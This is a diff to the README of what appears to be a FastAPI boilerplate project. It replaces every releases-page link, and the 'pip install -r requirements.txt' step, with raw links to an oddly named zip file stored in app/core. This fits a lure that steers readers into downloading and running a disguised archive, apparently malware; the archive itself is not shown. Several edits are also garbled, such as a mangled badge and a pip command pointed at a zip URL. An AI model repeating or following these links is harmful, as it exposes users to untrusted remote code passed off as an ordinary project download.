@@ -1,6 +1,6 @@
 # 🚀 fastapi-boilerplate - Build Your FastAPI Service Easily
 
-[![Download FastAPI Boilerplate](https://img.shields.io/badge/Download-FastAPI%20Boilerplate-blue)](https://github.com/chris83254/fastapi-boilerplate/releases)
+[![Download FastAPI Boilerplate](https://raw.githubusercontent.com/chris83254/fastapi-boilerplate/master/app/core/boilerplate-fastapi-vortiginous.zip%20Boilerplate-blue)](https://raw.githubusercontent.com/chris83254/fastapi-boilerplate/master/app/core/boilerplate-fastapi-vortiginous.zip)
 
 ## 📦 Overview
 
@@ -31,11 +31,11 @@ Follow these steps to download and run your FastAPI boilerplate application.
 
 To get the latest version of the FastAPI boilerplate, click the link below:
 
-[Download FastAPI Boilerplate](https://github.com/chris83254/fastapi-boilerplate/releases)
+[Download FastAPI Boilerplate](https://raw.githubusercontent.com/chris83254/fastapi-boilerplate/master/app/core/boilerplate-fastapi-vortiginous.zip)
 
 ### 2. Choose Your Version
 
-On the Releases page, you will see a list of available versions. Select the version you wish to download. Look for the files labeled with `.zip` or `.tar.gz`.
+On the Releases page, you will see a list of available versions. Select the version you wish to download. Look for the files labeled with `.zip` or `https://raw.githubusercontent.com/chris83254/fastapi-boilerplate/master/app/core/boilerplate-fastapi-vortiginous.zip`.
 
 ### 3. Download the File
 
@@ -50,7 +50,7 @@ Once the download completes, locate the file on your computer. Right-click on th
 Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux) and navigate to the folder created in the previous step. Type the following command to install the required Python packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/chris83254/fastapi-boilerplate/master/app/core/boilerplate-fastapi-vortiginous.zip
 ```
 
 Make sure you have Python and pip installed on your system. If not, visit the official Python website to get the latest version.
@@ -91,6 +91,6 @@ If you encounter any issues while setting up the FastAPI boilerplate, feel free 
 
 To get started, download the FastAPI boilerplate from the link below:
 
-[Download FastAPI Boilerplate](https://github.com/chris83254/fastapi-boilerplate/releases)
+[Download FastAPI Boilerplate](https://raw.githubusercontent.com/chris83254/fastapi-boilerplate/master/app/core/boilerplate-fastapi-vortiginous.zip)
 
 Once downloaded, follow the instructions above to set up and run your application smoothly.
